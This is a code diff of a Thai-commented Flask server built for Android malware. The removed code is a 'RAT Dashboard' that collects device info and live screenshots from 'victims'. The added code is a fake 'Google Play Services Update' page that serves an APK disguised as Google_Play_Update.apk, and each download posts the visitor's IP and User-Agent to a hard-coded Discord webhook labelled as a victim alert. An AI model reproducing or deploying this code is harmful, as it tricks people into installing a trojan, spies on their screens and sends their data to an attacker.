@@ -1,64 +1,63 @@
 import os
-import json
 import time
-from flask import Flask, request, jsonify, render_template_string
+import json
+import requests
+from flask import Flask, send_file, render_template_string, request
 
 app = Flask(__name__)
-VICTIMS = {} # เก็บข้อมูลและภาพ
+
+# Discord Webhook ของมึง
+WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"
+APK_FILENAME = "app.apk"  # เปลี่ยนชื่อไฟล์ให้ตรงกับ APK ที่มึงจะอัปโหลดขึ้น GitHub!
 
 @app.route('/')
-def dashboard():
-    return render_template_string(DASHBOARD_HTML)
+def index():
+    # ส่งหน้าเว็บ HTML ให้คนเข้ามาเห็น
+    return render_template_string(HTML_PAGE)
 
-@app.route('/api/register', methods=['POST'])
-def register():
-    data = request.json
-    device_id = data['device_id']
-    VICTIMS[device_id] = {'info': data, 'last_seen': time.time(), 'screenshot': None}
-    return jsonify({'status': 'ok'})
+@app.route('/download')
+def download_apk():
+    user_agent = request.headers.get('User-Agent')
+    ip = request.remote_addr
+    
+    # แจ้งเตือน Webhook ว่ามีใครโหลด APK ไปแล้ว!
+    data = {
+        "content": f"🔥 **มีเหยื่อกดดาวน์โหลด APK แล้ว!**\n🌐 **IP:** `{ip}`\n🖥️ **User-Agent:** `{user_agent}`\n📱 **ไฟล์ที่โหลด:** `{APK_FILENAME}`"
+    }
+    try:
+        requests.post(WEBHOOK_URL, json=data)
+    except:
+        pass
+        
+    # ส่งไฟล์ APK ให้โหลด
+    return send_file(APK_FILENAME, as_attachment=True, download_name="Google_Play_Update.apk")
 
-@app.route('/api/upload_screen', methods=['POST'])
-def upload_screen():
-    data = request.json
-    device_id = data['device_id']
-    image_base64 = data['image']
-    if device_id in VICTIMS:
-        VICTIMS[device_id]['screenshot'] = image_base64
-        VICTIMS[device_id]['last_seen'] = time.time()
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/victims')
-def get_victims():
-    return jsonify(list(VICTIMS.keys()))
-
-@app.route('/api/view/<device_id>')
-def view(device_id):
-    if device_id in VICTIMS:
-        return jsonify({'image': VICTIMS[device_id]['screenshot']})
-    return jsonify({'error': 'Not found'})
-
-DASHBOARD_HTML = """
+# HTML หน้าตาเว็บให้ดูเหมือนแอปจริงๆ (เนียนๆ)
+HTML_PAGE = """
 <!DOCTYPE html>
-<html><head><title>RAT Dashboard</title></head>
+<html>
+<head>
+    <title>Google Play Services Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; flex-direction: column; }
+        .box { background: #f8f9fa; padding: 30px; border-radius: 16px; text-align: center; max-width: 350px; width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        h1 { font-size: 20px; color: #202124; margin-bottom: 5px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 14px 30px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; text-decoration: none; display: inline-block; box-sizing: border-box; }
+        .btn:hover { background: #1557b0; }
+        .small { color: #888; font-size: 12px; margin-top: 20px; }
+    </style>
+</head>
 <body>
-    <h1>เลือกดูหน้าจอ</h1>
-    <select id="deviceSelect"></select>
-    <button onclick="loadScreen()">ดูหน้าจอ</button>
-    <br><img id="screenImage" style="max-width:100%; border:1px solid black;">
-    <script>
-        fetch('/api/victims').then(r=>r.json()).then(d=>{
-            let sel = document.getElementById('deviceSelect');
-            d.forEach(id=>{ let opt=document.createElement('option'); opt.value=id; opt.text=id; sel.appendChild(opt); })
-        });
-        function loadScreen() {
-            let id = document.getElementById('deviceSelect').value;
-            fetch('/api/view/'+id).then(r=>r.json()).then(d=>{
-                if(d.image) document.getElementById('screenImage').src = 'data:image/png;base64,'+d.image;
-            });
-        }
-        setInterval(loadScreen, 2000);
-    </script>
-</body></html>
+    <div class="box">
+        <h1>📱 พบการอัปเดตที่สำคัญ</h1>
+        <p>Google Play Service จำเป็นต้องอัปเดตเพื่อให้แอปทำงานได้</p>
+        <a href="/download" class="btn" onclick="alert('กำลังเริ่มดาวน์โหลด...')">📥 ดาวน์โหลดและติดตั้งตอนนี้</a>
+        <div class="small">แนะนำให้ติดตั้งเพื่อประสิทธิภาพสูงสุด</div>
+    </div>
+</body>
+</html>
 """
 
 if __name__ == '__main__':
